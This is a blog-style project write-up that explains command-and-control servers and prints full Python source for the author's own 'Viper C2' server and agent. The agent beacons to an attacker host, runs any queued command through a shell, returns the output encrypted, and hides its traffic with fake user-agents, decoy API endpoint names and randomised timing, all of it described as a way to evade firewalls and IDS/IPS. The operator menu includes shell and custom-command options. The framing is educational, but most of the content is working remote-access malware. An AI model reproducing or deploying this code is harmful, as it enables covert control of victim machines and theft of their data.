## Introduction
This programming project aimed to understand how C2 server/agents work. I have read articles and completed C2 in lab exercises that involve using frameworks such as [Empire](https://github.com/EmpireProject/Empire) and [Cobalt Strike](https://www.cobaltstrike.com/); however, I never really understood exactly what processes were being run under the hood.

## What is a Command and Control (C2) server?
Simply put, a C2 server is a central control point that attackers use to manage communication with infected machines. When an attacker installs malware onto a company's network, it is usually configured to connect back to the C2 server (owned by the attacker), allowing the attacker to receive/send commands, exfiltrate data, and update the infected machine's malware to launch even more sophisticated attacks.

## How do C2 servers work?
When an attacker infiltrates a network and downloads malware, they need a way to control the flow of the malicious program; they do this by reaching back (Beaconing) to a C2 server and repeatedly checking for new commands/tasks, essentially asking the C2 server: "What commands should I run next?". If the connection is still active, the C2 server (owned by the attacker) will send commands back to the agent (infected machine). These commands may include:
- Downloading a file
- Scanning other machines on the network (for lateral movement)
- Finding more information about the infected machine

## Types of C2 servers

## Analysis of Viper C2
Viper C2 was written in Python; it is a short but powerful program with features such as:
- Symmetrical encryption using Fernet (AES-128-CBC + HMAC-SHA-256)
- Random user-agents for obfuscation
- Random Headers to blend into normal traffic
- Random beaconing times do reduce the chances of the network traffic being alerted as abnormal 

## Vipers Server Code
### Data Encryption
```python
app = Flask(__name__)

SECRET_KEY = b'WT5hC0nZ1IDySQnT11S1qNal_srGJIyFDBVNu5DA84g='
cipher = Fernet(SECRET_KEY)

def encrypt_data(data):
	encoded = data.encode()
	encrypted = cipher.encrypt(encoded)
	return encrypted.decode()

def decrypt_data(data):
	decrypted = cipher.decrypt(data.encode())
	return decrypted.decode()

tasks = {}
agents = set()
```
To ensure that any data that is transferred between the server and the agent is anonymous and secure, I have implemented functions to encrypt the data and to decrypt it back to plain JSON. I have also declared a dictionary (tasks) that holds the list of commands for the agent. As well as the list, a set is also declared to hold connected agent IDs.

### /beacon Endpoint
```python
@app.route('/api/status', methods=['POST']) # Fake API for /beacon
def status():
	encrypted = request.json.get('data')
	decrypted_json = decrypt_data(encrypted)
	beacon_info = json.loads(decrypted_json)
	agent_id = beacon_info.get('id') # Extracts id field from JSON body

	if agent_id not in agents:
		print(Colors.wrap("[+] New agent connected: " + agent_id, Colors.GREEN))
		print("\n[admin] Enter 'list' to view agents, or 'send' to send command: ")
		agents.add(agent_id)
	if agent_id in tasks and tasks[agent_id]: # Check for any tasks left
		task = tasks[agent_id].pop(0) # Gets and removes task from list
		return jsonify({"task": task}) #JSON response
	else:
		return jsonify({"task": None})
```
This endpoint is used to receive and decrypt data sent from the agent and retrieve the agent ID from the JSON data. Any new agents that are retrieved are logged to the console, and the agent_id is saved to set() to track active agents. Finally, I have implemented a pull-based tasking technique for the agent to initiate communication with the server and check for queued commands in the task dictionary.

### /result Endpoint
```python
@app.route('/api/upload', methods=['POST'])
def upload():
	encrypted = request.json.get('data')
	decrypted_json = decrypt_data(encrypted)
	result_info = json.loads(decrypted_json)
	agent_id = result_info.get('id')
	output = result_info.get('output')
	print("\n[+] Result from" + agent_id + " " + output)
	admin_prompt()
	return jsonify({"status": "received"})
```
The /result endpoint has been changed to /API/upload to make the application look more "normal." I can improve this further by making a benign webpage to obfuscate the malicious endpoints further. The /result endpoint works by fetching any data uploaded by the agent (the agent's response), which can include the output of shell-executed commands or files. 

### /task Endpoint
```python
@app.route('/push', methods = ['POST']) # Fake API for /task
def push():
	agent_id = request.json.get('id')
	command = request.json.get('command')
	if agent_id not in tasks: # Checks if agent has a task queue
		tasks[agent_id] = [] # If agent does not have a queue yet, initialise one
	tasks[agent_id].append(command) # Adds new command to agents task queue
	return jsonify({"status": "task queued"})
```
The /push endpoint is another fake api for the malicious /task endpoint. This endpoint checks if the agent has a queue for tasks; if not, one will be initialised. Once a queue has been initialised, a command is added to the agent's task queue. 

### Admin Prompt
```python
def admin_prompt():
	print(Colors.wrap("\n[admin] Enter 'list' to view agents, or 'send' to send command: ", Colors.BLUE), end="")

def admin_console():
	while True:
		admin_prompt()
		cmd = input().strip().lower()
		if cmd == "list":
			print("[*] Known agents:")
			for aid in agents:
				print(f" - {aid}")
		elif cmd == "send":
			agent_id = input("Enter agent ID: ").strip()
			if agent_id not in agents:
				print(Colors.wrap("[!] Invalid agent ID.", Colors.RED))
				continue

			# Task Menu
			print(Colors.wrap("\nWhat would you like to do?", Colors.YELLOW))
			print("1. Send a Message")
			print("2. Get user info")
			print("3. Get public IP")
			print("4. Kill Zombie")
			print("5. Start a Shell")
			print("6. Whoami")
			print("7. Custom Command")

			choice = input("Enter choice (1-6): ").strip()

			# Match choice to command
			commands = {
				"1": 'echo "Hello from C2 server!"',
				"2": "id",
				"3": "curl ifconfig.me",
				"4": "pkill -f zombie",     
				"5": "/bin/bash",
				"6": "whoami"
			}

			if choice == "7":
				command = input("Enter your custom command: ").strip()
			else:
				command = commands.get(choice)

			if command:
				if agent_id not in tasks:
					tasks[agent_id] = []
				tasks[agent_id].append(command)
				print(Colors.wrap(f"[+] Queued command '{command}' for agent '{agent_id}'", Colors.GREEN))
			else:
				print(Colors.wrap("[!] Invalid choice.", Colors.RED))

		else:
			print(Colors.wrap("[!] Unknown command. Use 'list' or 'send'.", Colors.RED))

```
The admin console is a simple interface that:
- Connects to the victim machine (agent)
- Lists connected victim machines
- Prompts user to execute pre-made commands or allows custom commands/scripts to be inputted

This console will be further developed to add features such as sending a single command to all machines at once, and more options, such as screenshots of the victim machine.

```python
if __name__ == "__main__":
	print_banner()
	threading.Thread(target = admin_console, daemon = True).start() # Admin_console daemon
	app.run(host = "0.0.0.0", port = 4444, debug = False, use_reloader = False)
```
This function initiates an admin console thread to allow it to run and update concurrently with the other code. This ensures that any persistence/communication errors with the victim do not disrupt the user interface (admin console).

## Vipers Agent Code
### Initial Configurations
```python
# Configuration
SERVER_URL = "http://<REDACTED_IP>:4444"
BEACON_ENDPOINT = "/api/status" # Beacon
RESULT_ENDPOINT = "/api/upload" # Result
# Sleep min and max for pseudo-random request times 
SLEEP_MIN = 10
SLEEP_MAX = 30
```
The agent configuration is self-explanatory and should be evident from the code. The sleep_min and sleep_max will be explained later on.

### Encryption
```python
SECRET_KEY = b'WT5hC0nZ1IDySQnT11S1qNal_srGJIyFDBVNu5DA84g='
cipher = Fernet(SECRET_KEY)

def encrypt_data(data):
	encoded = data.encode()
	encrypted = cipher.encrypt(encoded)
	return encrypted.decode()

def decrypt_data(data):
	decrypted = cipher.decrypt(data.encode())
	return decrypted.decode()
```
As previously mentioned, data sent between the server and the agent is encrypted during transfer using Fernet, and tasks are managed through a dictionary and agent IDs through a set.

### Unique Agent ID
```python
# Generate a random, unique ID for the agent (change later)
AGENT_ID = str(uuid.uuid4())
print(f"Agent ID: {AGENT_ID}")
```
This snippet of code generates a random ID (using a universally unique identifier) for the agent. This is to track each agent individually and ensure tasks between the server and agents are assigned correctly. 

### Fake User-Agents and Headers
```python
# Fake user-agents to blend into normal traffic
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
]

headers = {
	"User-Agent": random.choice(USER_AGENTS),
    "Authorization": f"Bearer {AGENT_ID}",
    "X-Session-ID": str(uuid.uuid4())}
```
This is not necessary, but I added common user agents to make the traffic look more legitimate. I have also added headers to serve the same job. These camouflage tactics help blend our malicious traffic into normal browser traffic; this is important so security systems such as IDP/IPS or firewalls don't flag/block the communication.

### /beacon Endpoint
```python
# Sends a POST request to the beacon, then fetches any tasks 
def beacon():
	headers = {"User-Agent": random.choice(USER_AGENTS)}
	raw_payload = {"id": AGENT_ID}
	encrypted_payload = encrypt_data(json.dumps(raw_payload))
	try:
		response = requests.post(SERVER_URL + BEACON_ENDPOINT, json = {"data": encrypted_payload}, headers = headers)
		if response.status_code == 200:
			data = response.json()
			task = data.get("task")
			if task:
				execute_task(task)
	except Exception as e:
		print(f"[!] Beacon error: {e}")
```
The agent's beacon function does several tasks, including:
- Contacting and establishing a connection with the server
- Identifies itself using a unique agent ID
- Checks for tasks and executes them if available
- Masks requests to make it look like legitimate traffic

### System Shell Command Execution
```python
# Executes the received command using the sys shell
def execute_task(task):
	try:
		print(f"[+] Executing task: {task}")
		result = subprocess.check_output(task, shell = True, stderr = subprocess.STDOUT) # Spawns a new process, connects to pipes to obtain results
		post_result(result.decode()) # Sends response back to server via post_result func
	except subprocess.CalledProcessError as e:
		post_result(e.output.decode())
```
The execute task function executes any shell commands that are sent by the server. It then captures the output and reports it back the the server via the post_result function.

### /result Endpoint
```python
# Sends the result to the server /result endpoint
def post_result(result):
	headers = {"User-Agent": random.choice(USER_AGENTS)}
	raw_payload = {"id": AGENT_ID, "output": result}
	encrypted_payload = encrypt_data(json.dumps(raw_payload))
	try:
		requests.post(SERVER_URL + RESULT_ENDPOINT, json = {"data": encrypted_payload}, headers = headers)
	except Exception as e:
		print(f"[!] Result posting error: {e}")
```
The post result function encrypts all command output before sending the data back to the server. It adds fake headers to mimic normal web traffic and handles errors to maintain the agent's stability. 

### Main Function
```python
def main():
	while True:
		beacon()
		sleep_time = random.randint(SLEEP_MIN, SLEEP_MAX)
		time.sleep(sleep_time)

if __name__ == "__main__":
    main()
```
The main function is called an infinite loop, which is called the beacon function at every random interval. This is to avoid the network traffic from looking suspicious, as a uniform rate at which the beacon endpoint is called will make it look abnormal and suspicious.
